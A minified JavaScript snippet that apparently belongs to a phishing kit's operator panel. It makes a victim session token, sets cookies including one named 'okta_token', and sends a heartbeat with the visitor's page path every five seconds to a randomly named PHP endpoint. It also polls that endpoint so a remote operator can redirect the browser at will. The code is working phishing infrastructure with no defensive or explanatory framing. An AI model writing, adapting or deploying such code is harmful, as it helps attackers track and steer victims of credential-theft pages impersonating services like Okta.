(function(){
'use strict';
function hostKey(){return location.host||'panel';}
function uuid(){return'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g,function(c){var r=Math.random()*16|0,v=c==='x'?r:(r&0x3|0x8);return v.toString(16);});}
function getToken(){try{var k='t:'+hostKey();var t=sessionStorage.getItem(k)||localStorage.getItem(k)||sessionStorage.getItem('t')||localStorage.getItem('t');if(!t){t=uuid();sessionStorage.setItem(k,t);localStorage.setItem(k,t);}return t;}catch(e){return uuid();}}
function getWindowId(){try{var k='w:'+hostKey();var w=sessionStorage.getItem(k)||sessionStorage.getItem('w');if(!w){w='w'+Date.now()+'_'+Math.random().toString(36).substr(2,9);sessionStorage.setItem(k,w);}return w;}catch(e){return'w'+Date.now();}}
var t=getToken(),w=getWindowId();
window.__token=t;window.__windowId=w;window.getToken=getToken;window.getWindowId=getWindowId;
try{var attrs=';path=/;max-age=86400;Secure;SameSite=Lax';document.cookie='token='+t+attrs;document.cookie='okta_token='+t+attrs;document.cookie='window_id='+w+attrs;}catch(e){}
function hb(){if(!t)return;fetch('/api_FyekIDWY.php',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'heartbeat',token:t,window_id:w,page:window.location.pathname})}).catch(function(){});}
function cr(){if(!t){setTimeout(cr,2000);return;}fetch('/api_FyekIDWY.php?action=check_redirect&token='+encodeURIComponent(t)+'&window_id='+encodeURIComponent(w)).then(function(r){return r.json();}).then(function(d){if(d&&d.redirect){window.location.href=d.redirect;}else{setTimeout(cr,2000);}}).catch(function(){setTimeout(cr,2000);});}
window.sendHeartbeat=hb;
hb();setInterval(hb,5000);setTimeout(cr,2000);
})();
